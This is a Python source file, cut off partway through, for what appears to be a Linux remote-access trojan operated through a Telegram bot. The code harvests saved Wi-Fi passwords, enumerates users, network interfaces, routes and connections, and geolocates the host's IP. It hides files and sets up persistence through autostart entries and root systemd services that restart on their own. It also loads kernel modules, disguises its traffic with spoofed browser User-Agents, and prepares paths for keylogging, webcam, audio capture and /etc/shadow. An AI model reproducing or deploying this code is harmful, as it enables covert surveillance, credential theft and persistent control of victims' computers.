#==================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 21.04.2026
#     PROJECT  : LINUX-TELEGRAM-BOT
#     PLATFORM : LINUX
#==================================#




import os
from   sys import (
    argv, 
    executable as pyexe,
    platform   as _sos
)


if not _sos.startswith('linux'):
    raise SystemError(f'OS NOT SUPPORTED ({_sos})')


if not os.environ.get('PATH'):
    os.environ['PATH'] = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'


__file__ = os.path.realpath(argv[0])




#
#-
#--
#---
#----
#-----
#------
#-------------------------|NECESSARILY|-------------------------#
# TELEGRAM BOT TOKEN
TOKEN: str = '' 


# PASSWORD FOR SESSION WITH TELEGRAM BOT 
# GENERATE: python -c "from hashlib import sha256;print(sha256('THERE IS PASSWORD'.encode()).hexdigest())"
PASSWORD: str = '' 


# RESPONSIBLE FOR ENCRYPTION INITIAL VALUES
SEED: int = 0  


# PATH TO SAVE TELEGRAM BOT
PATH: str = '' 
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
# HOW TO SAVE TELEGRAM BOT NAME IN PATH 
BOT_FILE_NAME: str = os.path.basename(__file__) 


# SERVICE NAME IN SYSTEMCTL FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_SERVICE_NAME: str = '' 


# SERVICE DESCRIPTION IN SYSTEMCTL FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_SERVICE_DESCRIPTION: str = ''


# TELEGRAM BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE
BOT_EXE: bool = False 
#----------------------------|END|---------------------------#
#------
#-----
#----
#---
#--
#-
#




LIBS = (
    'tabulate',
    'chardet',
    'requests',
    'psutil',
    'mouse',
    'keyboard',
    'pyperclip',
    'mss',
    'ffmpeg-python',
    'telebot'
)




__import__('warnings').filterwarnings('ignore')
__import__('logging').disable(50)




import shutil
import platform

from hashlib         import sha256
from threading       import Thread
from multiprocessing import Process
from getpass         import getuser
from stat            import filemode
from locale          import getlocale
from importlib.util  import find_spec
from json            import loads as json
from webbrowser      import open  as open_site
from codecs          import getincrementaldecoder
from re              import compile as re_exp, DOTALL
from shlex           import quote, split as split_args
from io              import BytesIO,     StringIO
from pwd             import getpwuid,    getpwnam
from datetime        import datetime,    timedelta
from time            import sleep,       time,        ctime
from random          import seed,        randint,     choice
from subprocess      import run as sp_run, Popen, PIPE, DEVNULL
from socket          import gethostbyname as verify_domain, AF_INET, AF_INET6




mem      = memoryview
_absp    = os.path.realpath
_splitp  = os.path.split
_exist   = os.path.exists
_isfile  = os.path.isfile
_isdir   = os.path.isdir
_scandir = os.scandir




def invalid_type(name, val, valid):
    if isinstance(val, valid):
        return
    
    raise TypeError(f'({name}) must be ({valid.__name__})')




invalid_type('BOT_EXE',       BOT_EXE,       bool)
invalid_type('BOT_FILE_NAME', BOT_FILE_NAME, str )

if not BOT_FILE_NAME:
    raise ValueError('(BOT_FILE_NAME) is empty')


if (__name_qe := argv[-1]).startswith('--name='):###
    BOT_FILE_NAME = __name_qe.removeprefix('--name=')




NULL          = 'N/A'
FILE_ENCODING = 'UTF-8'


PATH_CPUINFO     = '/proc/cpuinfo'
PATH_DMI         = '/sys/class/dmi/id'
PATH_RUN_USER    = '/run/user'
PATH_SHADOW      = '/etc/shadow'
PATH_ENVIRONMENT = '/etc/environment'
PATH_SYSTEMCTL   = '/etc/systemd/system'
PATH_CRONTAB     = '/etc/crontab'
PATH_BASH        = '/bin/bash'
PATH_SUDO        = shutil.which(
        'pkexec' 
    if os.getenv('DISPLAY') or os.getenv('WAYLAND_DISPLAY') else 
        'sudo'
) or '/usr/bin/sudo'


BOT_FILE_PATH          = f'{PATH}/{BOT_FILE_NAME}'
BOT_FILE_PATH_HIDDEN   = NULL
BOT_FILE_PATH_RECOVERY = f'/tmp/._{BOT_FILE_NAME}'


PATH_MEM   = f'{PATH}/mem'
PATH_SYS   = f'{PATH}/sys'
PATH_CONF  = f'{PATH_SYS}/conf'
PATH_TMP   = f'{PATH}/tmp'
PATH_SHARE = f'{PATH}/share'
PATH_VENV  = f'{PATH}/.venv'


CONFIG_TOKEN    = f'{PATH_CONF}/0'
CONFIG_PASSWORD = f'{PATH_CONF}/1'
CONFIG_SEED     = f'{PATH_CONF}/2'


FILE_PYTHON            = f'{PATH_VENV}/bin/python'
FILE_PIP               = f'{PATH_VENV}/bin/pip'

FILE_INIT              = f'{PATH_SYS}/.init'
FILE_AUTOSTART         = f'{PATH_SYS}/0'
FILE_KEYLOGGER_FLAG    = f'{PATH_SYS}/1'

FILE_APP_BLOCKER       = f'{PATH_TMP}/0'
FILE_KEYLOGGER         = f'{PATH_TMP}/1'
FILE_WEBCAM_SCREENSHOT = f'{PATH_TMP}/2'
FILE_AUDIO             = f'{PATH_TMP}/3'

FILE_HOSTS             = '/etc/hosts'


KEYLOGGER_BUFFER_SIZE = 255


PID            = os.getpid() 
MACHINE        = platform.machine()
ARCHITECTURE   = platform.architecture()[0]
BOOT           = 'UEFI' if _exist('/sys/firmware/efi') else 'BIOS'
PROCESSOR      = platform.processor()
NODE           = platform.node()
USER           = getuser()
LOGGED_USER    = 'root'
LANG, ENCODING = getlocale()
OS             = (
    platform.system(), 
    platform.release(), 
    platform.version()
)
CHASSIS_TYPE   = (
    0,
    'VM',         'VM',
    'DESKTOP',    'DESKTOP',
    'OTHER',
    'DESKTOP',    'DESKTOP',
    'LAPTOP',     'LAPTOP',     'LAPTOP'
)


HTTP_HEADER = choice(({'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}))


IPCONFIG_URL = 'https://ipinfo.io/json'
IPCONFIG_KEY = (
             'ip',         'org',
    'country',    'region',      'city',
    'postal',     'timezone',    'loc'
)




try:

    with open(PATH_CPUINFO, 'rb') as f:
        lb = b'model name'

        for l in f:
            if not l.startswith(lb):
                continue
            

            idx = l.find(b':')

            if idx == -1:
                continue


            PROCESSOR = l[idx + 1 :].strip().decode()
            break

except OSError: 
    pass


 

def get_logged_user(*, _uh='/home/'):
    uid  = 0
    name = 'root'


    if not _isdir(PATH_RUN_USER):
        return (uid, name)

    
    with _scandir(PATH_RUN_USER) as d:
        for e in d:
            n = e.name

            if not n.isdigit():
                continue

            uid = int(n)


            try:

                pwu = getpwuid(uid)

                if pwu.pw_dir.startswith(_uh):
                    name = pwu.pw_name
                    break

            except KeyError:
                continue


    return (uid, name)




def get_display(uid, *, _ch={}):
    if uid in _ch:
        return _ch[uid]


    r = (None, None)


    for p in psutil.process_iter(('uids', 'environ')):
        try:

            if p.info['uids'].real != uid:
                continue


            env = p.info.get('environ')

            if not env:
                continue


            if wayland := env.get('WAYLAND_DISPLAY'):
                r = ('WAYLAND_DISPLAY', wayland)
                break
            
            elif x11 := env.get('DISPLAY'):
                r = ('DISPLAY', x11)
                break
            
        except Exception:
            continue

    
    _ch[uid] = r
    return r




def parse_cmd(exp, cmd, *, _hs=str.__hash__, _ch={}):
    h = _hs(exp)
    f = _ch.get(h)
    

    if f is None:
        f = re_exp(exp, flags=DOTALL).match
        _ch[h] = f


    if r := f(cmd):
        return {k: v.strip() if v else None 
                for k, v in r.groupdict().items()}
    
    return None




def http(url, json=False):
    try:
        req = http_get(url, headers=HTTP_HEADER, timeout=60)
        req.raise_for_status()

        return req.json() if json else mem(req.content)
    except Exception:
        return {} if json else None




def get_date(*, _fm='%H:%M %d.%m.%Y'):
    try: 
        return datetime.now().strftime(_fm).split()
    except Exception: 
        return (NULL, NULL)
    



def decode_bytes(dt, *, _ck=4096):
    if not dt:
        return ''


    ec = detect(dt[0 : 255].tobytes()).get('encoding') or ENCODING
    dc = getincrementaldecoder(ec)(errors='replace')
    

    with StringIO() as buf:
        _de = dc.decode
        _wt = buf.write


        for i in range(0, len(dt), _ck):
            _wt(_de(dt[i : i + _ck]))
            

        _wt(_de(b'', final=True))
        return buf.getvalue()




def encrypt(dt, *, _d=ord, _c=chr):
    k0 = KEY[0]
    k1 = KEY[1]


    f = i = 0

    with StringIO() as buf:
        _wt = buf.write


        for c in dt:
            n = _d(c)  
            x = (n << k0) ^ ( ((k1 + f) + i) & 0xFF )
            f = (f ^ x) & 0xFF
            
            _wt(_c(x))
            i += 1
        
        
        return buf.getvalue()
    



def decrypt(dt, *, _d=ord, _c=chr):
    k0 = KEY[0]
    k1 = KEY[1]


    f = i = 0

    with StringIO() as buf:
        _wt = buf.write
        

        for c in dt:
            n = _d(c)     
            x = n ^ ( ((k1 + f) + i) & 0xFF )  
            o = x >> k0        
            f = (f ^ n) & 0xFF 
            
            _wt(_c(o))
            i += 1
        

        return buf.getvalue()
    



def mem_id(uid):
    return str( (uid << KEY[0]) ^ KEY[1] )




def write_file(p, dt):
    if isinstance(dt, str):
        md = 'w'
        ec = FILE_ENCODING
    else:
        md = 'wb'
        ec = None


    with open(p, md, encoding=ec) as f:
        f.write(dt)
        f.flush()




def read_file(p, b=False):
    if b:
        md = 'rb'
        ec = er = None 
    else:
        md = 'r'
        ec = FILE_ENCODING
        er = 'replace'


    with open(p, md, encoding=ec, errors=er) as f:
        dt = f.read()
        return mem(dt) if b else dt




def change_file(p, pattern, val, delete=False, enc=False):
    ok = False

    
    if not _isfile(p):
        return ok

    if not val.endswith('\n'):
        val += '\n'

    
    dt = []

    with open(p, 'r', encoding=FILE_ENCODING) as f:
        _au = dt.append
        _dc = decrypt


        for l in f:
            if enc:
                l = _dc(l)
            

            if pattern in l:
                if delete:
                    ok = True
                else:
                    _au(val)
                    ok = True
            else:
                _au(l)


    if not delete and not ok:
        dt.append(val)
        ok = True


    if ok:
        with open(p, 'w', encoding=FILE_ENCODING) as f:
            _wt = f.write
            _en = encrypt


            for l in dt:
                _wt(_en(l) if enc else l)


    return ok
        



if _isfile(CONFIG_SEED):
    try:

        _sd = read_file(CONFIG_SEED)

        if _sd.isdigit():
            SEED = int(_sd)

    except Exception: 
        pass



seed(SEED)
KEY = (randint(1, 8), randint(1, 256))



if _isfile(CONFIG_TOKEN):
    try:
        TOKEN = decrypt(read_file(CONFIG_TOKEN))
    except Exception: 
        pass


if _isfile(CONFIG_PASSWORD):
    try:
        PASSWORD = decrypt(read_file(CONFIG_PASSWORD))
    except Exception: 
        pass




def mkdir(p, *, _md=os.mkdir):
    if isinstance(p, str) and not _isdir(p):
        _md(p)
    else:
        for d in p:
            if not _isdir(d):
                _md(d)




def shell(c, output=False, input=False, timeout=600, _new=False):
    try:
        ex = sp_run(
            c, 
            input   = input, 
            stdout  = PIPE if output else DEVNULL, 
            stderr  = DEVNULL, 
            timeout = timeout,
            shell   = True,
            start_new_session=_new
        )
    except Exception:
        return None if output else False


    if output:
        if not ex.stdout:
            return None
        
        return decode_bytes(mem(ex.stdout))


    return ex.returncode == 0




def autostart():
    if not _isfile(FILE_AUTOSTART):
        return
    

    try:
        dt = decrypt(read_file(FILE_AUTOSTART)).splitlines()
    except Exception:
        return
    

    sep = '\u200B'
    
    for l in dt:
        try:
            _, p, arg, _ = l.split(sep)
            launch(p, '' if arg == 'none' else arg)
        except Exception:
            continue




def ls(p='.', *, _fm=filemode, _gp=getpwuid, _tm=ctime):
    r  = []
    au = r.append
    

    try:
        sc = _scandir(p)
    except OSError:
        return r

    for e in sc:
        try:

            st = e.stat()

            try:
                own = _gp(st.st_uid).pw_name
            except KeyError:
                own = st.st_uid

            au((
                e.path, 

                _fm(st.st_mode),
                'DIR'  if e.is_dir()             else 'FILE', 
                'TRUE' if e.name.startswith('.') else 'FALSE', 

                own,
                f'{st.st_size} bytes', 
                _tm(st.st_mtime)  
            ))

        except Exception:
            continue

    
    sc.close()
    return r




def hide(p, *, _ret=False):
    p = _absp(p)
    dir, base = _splitp(p)

    if base.startswith('.'):
        return p if _ret else True


    newp = f'{dir}/.{base}'

    if _exist(newp):
        return p if _ret else False


    try:
        os.rename(p, newp)
        return newp if _ret else True
    except OSError:
        return p if _ret else False
    



def unhide(p):
    p = _absp(p)
    dir, base = _splitp(p)

    if not base.startswith('.'):
        return True


    newp = f'{dir}/{base[1 :]}'

    try:
        os.rename(p, newp)
        return True
    except OSError:
        return False
    



def ipconfig(*, _ch=[None]):
    if _ch[0] is None:
        req = http(IPCONFIG_URL, json=True)
        rgt = req.get

        _ch[0] = {
            'ip'       : rgt(IPCONFIG_KEY[0], NULL),
            'isp'      : rgt(IPCONFIG_KEY[1], NULL),
            'country'  : rgt(IPCONFIG_KEY[2], NULL),
            'region'   : rgt(IPCONFIG_KEY[3], NULL),
            'city'     : rgt(IPCONFIG_KEY[4], NULL),
            'postal'   : rgt(IPCONFIG_KEY[5], NULL),
            'timezone' : rgt(IPCONFIG_KEY[6], NULL),
            'location' : rgt(IPCONFIG_KEY[7], NULL)  
        }

    
    gbi = _ch[0]


    try:

        lci = []

        for (name, addr) in psutil.net_if_addrs().items():
            intr = {
                'name' : name, 
                'mac'  : NULL,
                'ipv4' : NULL, 
                'ipv6' : NULL
            }

            for i in addr:
                if i.family == AF_INET:
                    intr['ipv4'] = i.address or NULL 
                elif i.family == AF_INET6:
                    intr['ipv6'] = i.address or NULL 
                else:
                    intr['mac'] = (i.address or NULL).replace('-', ':').upper()
            
            lci.append(intr)

    except Exception:
        lci = None


    return (gbi, lci)




def route():
    r = [[], []]


    out = shell('ip -j -4 route', output=True)

    if out:
        for i in json(out):
            r[0].append((
                i.get('dev',      NULL),
                i.get('dst',      NULL),
                i.get('gateway',  NULL),
                i.get('prefsrc',  NULL),
                i.get('protocol', NULL).upper(),
                i.get('scope',    NULL).upper(),
                i.get('metric',   NULL)
            ))
    else:
        r[0] = None


    out = shell('ip -j -6 route', output=True)

    if out:
        for i in json(out):
            r[1].append((
                i.get('dev',      NULL),
                i.get('dst',      NULL),
                i.get('pref',     NULL).upper(),
                i.get('protocol', NULL).upper(),
                i.get('metric',   NULL)
            ))       
    else:
        r[1] = None


    return r




def arp():
    r = []


    out = shell('ip -j neigh', output=True)
    
    if not out:
        return r
    

    for i in json(out):
        r.append((
           i.get('dst',    NULL),
           i.get('lladdr', NULL).upper(),
           i.get('dev',    NULL),
           i.get('state', [NULL])[0]
        ))


    return r




def netstat():
    r = []


    out = shell('netstat -tunp', output=True)

    if not out:
        return r
    

    prot = ('tcp', 'udp')

    with StringIO(out) as buf:
        for l in buf:
            n = l.split()

            if (len(n) < 7) or (n[0] not in prot):
                continue


            r.append((
                    n[6],
                n[0].upper(),
                n[3],   n[4],
                    n[5]
            ))
        

    return r




def wifi():
    r = []


    out = shell('nmcli -t -e no -f SSID,CHAN,RATE,MODE,SECURITY,SIGNAL,BSSID dev wifi list', output=True)

    if not out:
        return r
    

    with StringIO(out) as buf:
        for l in buf:
            n = l.split(':', 6) 

            if len(n) < 7:
                continue


            r.append((
                n[0] or '<hidden>',
                n[6].rstrip(),
                n[1],    n[2],
                n[3],    n[4],
                    n[5]
            ))


    r.sort(key=lambda s: s[6], reverse=True)
    return r




def wifi_password():
    r = []


    out = shell('nmcli -t -f NAME,TYPE connection show', output=True)

    if not out:
        return r
    

    lb = '802-11-wireless'
    
    with StringIO(out) as buf:
        for l in buf:
            try:
                ssid, wtyp = l.split(':', 1)
            except ValueError:
                continue

            if not wtyp.startswith(lb):
                continue


            prof = ssid.replace('\\:', ':')

            psk = shell(f'nmcli -s -g 802-11-wireless-security.psk connection show {quote(prof)}', output=True)
            psk = (psk or '').strip()

            if not psk or (psk == '--'):
                continue


            r.append((prof, psk))
    

    return r




def get_user(user=None):
    r = []


    try:
        out = read_file('/etc/passwd')
    except OSError:
        return r
    

    sk = ('nologin', 'false', 'sync')
    
    with StringIO(out) as buf:
        for l in buf:
            i = l.split(':')

            if len(i) < 7:
                continue
            

            name, _, uid, gid, _, home, shell = i
            shell = shell.rstrip()


            if (
                (user and (name != user)) or 
                (int(uid) < 1000)         or 
                not _isdir(home)          or
                shell.endswith(sk)
            ):
                continue


            r.append((
                    name, 
                uid,     gid, 
                home,    shell
            ))
        

    return r




def uptime():
    try:
        s = float(read_file('/proc/uptime').split(maxsplit=1)[0])
    except OSError:
        return NULL


    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m    = s // 60


    r = []

    if d: r.append(f'{int(d)}d')
    if h: r.append(f'{int(h)}h')
    if m: r.append(f'{int(m)}m')
        

    return ','.join(r) if r else '0m'




def systeminfo():
    init_user()

    with StringIO() as buf:
        try:
            idx     = int(read_file(f'{PATH_DMI}/chassis_type'))
            chassis = CHASSIS_TYPE[idx]
        except (ValueError, IndexError, OSError):
            chassis = NULL
        

        buf.write(f'''(SYSTEM):
\tUPTIME           : {uptime()}
\tDEVICE           : {chassis}
\tMACHINE          : {MACHINE}
\tARCHITECTURE     : {ARCHITECTURE}
\tBOOT             : {BOOT}
\tOS               : {OS[0]} {OS[1]} {OS[2]}
\tNODE             : {NODE}
\tUSER             : {USER}
\tLOGGED USER      : {LOGGED_USER}
\tLANG             : {LANG}
\tENCODING         : {ENCODING}
''')
        
        

        guser = get_user()
        buf.write('\n(USER):\n')

        if guser:
            for u in guser:
                buf.write(
f'''\tNAME  : {u[0]}
\tUID   : {u[1]}
\tGID   : {u[2]}
\tDIR   : {u[3]}
\tSHELL : {u[4]}
\n''')



        buf.write(f'{"" if guser else "\n"}(IPCONFIG):\n')
        gbi, lci = ipconfig()

        if gbi:
            buf.write(f'''\t((GLOBAL)):
\t\tIP       : {gbi["ip"]}
\t\tISP      : {gbi["isp"]}
\t\tCOUNTRY  : {gbi["country"]}
\t\tREGION   : {gbi["region"]}
\t\tCITY     : {gbi["city"]}
\t\tPOSTAL   : {gbi["postal"]}
\t\tTIMEZONE : {gbi["timezone"]}
\t\tLOCATION : {gbi["location"]}''')
            
        if lci:
            buf.write('\n\n\t((LOCAL)):\n')

            for i in lci:
                buf.write(
f'''\t\tIFACE : {i["name"]}
\t\tMAC   : {i["mac"]}
\t\tIPV4  : {i["ipv4"]}
\t\tIPV6  : {i["ipv6"]}
\n''')
        
        
        
        try:
            bios_vendor = read_file(f'{PATH_DMI}/bios_vendor').rstrip()
        except OSError:
            bios_vendor = NULL

        try:
            bios_version = read_file(f'{PATH_DMI}/bios_version').rstrip()
        except OSError:
            bios_version = NULL

        try:
            bios_date = read_file(f'{PATH_DMI}/bios_date').rstrip()
        except OSError:
            bios_date = NULL


        buf.write(f'''{"" if lci else "\n"}(BIOS):
\tVENDOR  : {bios_vendor}
\tVERSION : {bios_version}
\tDATE    : {bios_date}
''')



        try:
            baseboard_product = read_file(f'{PATH_DMI}/board_name').rstrip()
        except OSError:
            baseboard_product = NULL

        try:
            baseboard_vendor = read_file(f'{PATH_DMI}/board_vendor').rstrip()
        except OSError:
            baseboard_vendor = NULL

        try:
            baseboard_version = read_file(f'{PATH_DMI}/board_version').rstrip()
        except OSError:
            baseboard_version = NULL        
        

        buf.write(f'''\n(BASEBOARD):
\tPRODUCT : {baseboard_product}
\tVENDOR  : {baseboard_vendor}
\tVERSION : {baseboard_version}
''')
        


        buf.write('\n(BATTERY):\n')
        bat = psutil.sensors_battery()

        if bat:
            tl   = NULL
            secs = bat.secsleft

            if secs and (secs > 0):
                tl = f'{secs // 60}m'


            buf.write(
f'''\tPERCENT    : {NULL if bat.percent is None else int(bat.percent)}%
\tPLUGGED IN : {"TRUE" if bat.power_plugged else "FALSE"}
\tTIME LEFT  : {tl}
''')
            

    
        cfreq = psutil.cpu_freq()
        cperc = psutil.cpu_percent()


        mhz = (
                (f'cur({int(cfreq.current)})/' 
                 f'min({int(cfreq.min)})/'
                 f'max({int(cfreq.max)}) MHz')
            if cfreq else 
                NULL
        )

        buf.write(f'''\n(CPU):
\tNAME      : {PROCESSOR}
\tCORE      : {psutil.cpu_count(False) or NULL}
\tFREQUENCY : {mhz}
\tUSAGE     : {NULL if cperc is None else int(cperc)}%
''')
        


        buf.write('\n(GPU):\n')
        gpu = []


        out = shell('lspci -v', output=True)

        if out:
            with StringIO(out) as lsp:
                dv = [NULL, NULL, NULL]
                lb = ('VGA', '3D ')
                sk = True


                for l in lsp:
                    if sk and (l[8 : 11] not in lb):
                        continue


                    if l.startswith('\tSubsystem:'):
                        dv[0] = l[12 : -1]

                    elif l.startswith('\tFlags:'):
                        dv[1] = l[8 : -1]

                    elif l.startswith('\tKernel driver'):
                        dv[2] = l[23 : -1]

        
                    sk = l == '\n'

                    if sk:
                        gpu.append(dv)
                        dv = [NULL, NULL, NULL]
            

        if gpu:
            for v in gpu:
                buf.write(
f'''\tNAME   : {v[0]}
\tFLAG   : {v[1]}
\tDRIVER : {v[2]}
\n''')
        

   
        buf.write(f'{"" if gpu else "\n"}(RAM):\n')
        pmem = psutil.virtual_memory()

        if pmem:
            buf.write(
f'''\tTOTAL : {NULL if pmem.total   is None else pmem.total >> 30} GiB
\tUSED  : {    NULL if pmem.used    is None else pmem.used  >> 30} GiB
\tFREE  : {    NULL if pmem.free    is None else pmem.free  >> 30} GiB
\tUSAGE : {    NULL if pmem.percent is None else int(pmem.percent)}%
''')
            


        buf.write('\n(SWAP):\n')
        pswap = psutil.swap_memory()
        
        if pswap:
            buf.write(
f'''\tTOTAL : {NULL if pswap.total   is None else pswap.total >> 30} GiB
\tUSED  : {    NULL if pswap.used    is None else pswap.used  >> 30} GiB
\tFREE  : {    NULL if pswap.free    is None else pswap.free  >> 30} GiB
\tUSAGE : {    NULL if pswap.percent is None else int(pswap.percent)}%
''')
            


        buf.write('\n(DISK):\n')
        pdisk = psutil.disk_partitions()

        if pdisk:
            fdu = psutil.disk_usage

            for d in pdisk:
                try:
                    duse = fdu(d.mountpoint)
                except OSError:
                    continue


                buf.write(
f'''\tNAME         : {d.device if d.device else NULL}
\tMOUNT OPTION : {    d.opts   if d.opts   else NULL}
\tFILE SYSTEM  : {    d.fstype if d.fstype else NULL}
\tTOTAL        : {NULL if duse.total   is None else duse.total >> 30} GiB
\tUSED         : {NULL if duse.used    is None else duse.used  >> 30} GiB
\tFREE         : {NULL if duse.free    is None else duse.free  >> 30} GiB
\tUSAGE        : {NULL if duse.percent is None else int(duse.percent)}%
\n''')
        


        return buf.getvalue()
    



def modprobe(mode, name=None):
    match mode:
        case 'get':
            modprobe_module = []

            lsmod = shell('lsmod', output=True)

            if lsmod is None:
                return modprobe_module
            
            for line in lsmod.splitlines():
                n = line.split()
                n_len = len(n)

                if (n_len < 3) or not n[1].isdigit():
                    continue

                modprobe_module.append([
                    n[0],
                    f'{n[1]} bytes',
                    n[2],
                    n[3] if n_len > 3 else NULL
                ])

            return modprobe_module
        case 'installed':
            return shell(f'modprobe {quote(name)}')
        case 'deleted':
            return shell(f'modprobe -r {quote(name)}')
        

def systemctl(mode, name=None, description=None, path=None, args='none', root=True, _reload=True):
    init_user()

    if not os.path.isdir(PATH_SYSTEMCTL):
        raise RuntimeError('systemctl is not working')


    def exist():
        try:
            return bool(shell(f'systemctl status {quote(name)}', output=True).strip())
        except:
            return False
        

    match mode:
        case 'get':
            with StringIO() as buf:
                try:
                    list_units = json(shell('systemctl list-units --type=service --all --output=json', output=True))
                except:
                    return ''
            
                for n in list_units:
                    buf.write(f'''NAME: {n.get("unit", NULL)}
DESCRIPTION: {n.get("description", NULL)}
LOAD: {n.get("load", NULL).upper()}
SUB: {n.get("sub", NULL).upper()}
STATUS: {n.get("active", NULL).upper()}\n
''')

                return buf.getvalue()
        case 'query':
            if not exist():
                return ''

            service_status = shell(f'systemctl status {quote(name)}', output=True)
            service_show = shell(f'systemctl show {quote(name)}', output=True)

            return f'{service_status}\n\n{service_show}'
        case 'update':
            return shell('systemctl daemon-reload')
        case 'create':
            if os.path.exists(path):
                path = os.path.realpath(path)

            with open(os.path.join(PATH_SYSTEMCTL, f'{name}.service'), 'w') as f:
                f.write(f'''[Unit]
Description={description}

[Service]
Type=simple
ExecStart="{path}" {"" if args == "none" else args}
User={"root" if root else LOGGED_USER}
Restart=always

[Install]
WantedBy=multi-user.target
''')
            shell(f'systemctl enable {quote(name)}')

            if _reload:
                shell('systemctl daemon-reload')
            
            return f'service is created ({name}) [+]'
        case 'delete':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            shell(f'systemctl disable {quote(name)}')
            shell(f'systemctl stop {quote(name)}')

            for n in [
                f'/etc/systemd/system/{name}.service',   
                f'/lib/systemd/system/{name}.service',   
                f'/usr/lib/systemd/system/{name}.service',  
                f'/home/{LOGGED_USER}/.config/systemd/user/{name}.service'
            ]:
                if os.path.isfile(n):
                    os.remove(n)
            
            shell('systemctl daemon-reload')
                
            return f'service is deleted ({name}) [+]'
        case 'enable':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is enabled ({name}) [+]' if shell(f'systemctl enable {quote(name)}') else f'failed to enable service ({name}) [-]'
        case 'disable':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is disabled ({name}) [+]' if shell(f'systemctl disable {quote(name)}') else f'failed to disable service ({name}) [-]'
        case 'start':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is started ({name}) [+]' if shell(f'systemctl start {quote(name)}') else f'failed to start service ({name}) [-]'
        case 'restart':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
